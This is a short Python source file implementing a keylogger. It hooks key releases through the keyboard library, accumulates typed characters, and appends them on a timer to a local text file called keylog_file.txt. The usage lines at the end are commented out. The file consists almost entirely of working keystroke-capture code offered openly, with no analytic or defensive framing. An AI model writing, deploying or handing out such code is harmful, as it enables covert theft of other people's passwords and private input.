import keyboard 
from threading import Timer
from datetime import date

class Keylogger:
    def __init__(self, interval):

        self.interval = interval
        self.log = ""
        self.today = date.today()

    def callback(self, event):

        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        if '[' in name:pass
        else:
            self.log += name
                    
    def report_to_file(self):
        file_ = open("keylog_file.txt", "a")
        print(self.log, file=file_)
        file_.close()

    def report(self):
        if self.log:
            self.report_to_file()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


# keylogger = Keylogger(interval=30)
# keylogger.start()